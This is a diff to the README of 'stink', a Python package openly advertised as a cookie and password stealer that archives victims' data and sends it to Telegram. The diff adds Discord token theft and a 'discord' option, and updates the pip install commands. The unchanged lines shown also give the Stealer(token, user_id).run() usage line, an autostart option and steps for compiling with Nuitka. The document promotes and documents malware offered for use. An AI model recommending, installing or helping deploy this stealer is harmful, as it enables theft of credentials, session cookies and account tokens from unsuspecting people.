@@ -43,6 +43,7 @@ Cookies and passwords stealer in just 2 lines. Sending to Telegram.
    - IP-address
    - System configuration
    - Active processes
+   - Discord tokens
 3. Sending an archive of collected data to Telegram.
 4. Execution in a separate thread.
 5. Possibility to add to autostart.
@@ -55,7 +56,7 @@ Cookies and passwords stealer in just 2 lines. Sending to Telegram.
 
 You can install the latest version with the command:
 ```
-pip install stink==1.1.0
+pip install stink==1.2.0
 ```
 
 ## Example usage
@@ -82,6 +83,8 @@ Stealer(token="YOUR_TOKEN", user_id=YOUR_ID).run()
 - `system` - collecting system configuration.
 
 - `screen` - screenshot.
+
+- `discord` - collecting Discord tokens.
 
 All parameters take the value of `bool`. 
 
@@ -161,7 +164,7 @@ venv\Scripts\activate
 pip install Nuitka==0.6.16.4
 ```
 ```
-pip install stink==1.1.0
+pip install stink==1.2.0
 ```
 6. Write the command:
 ```
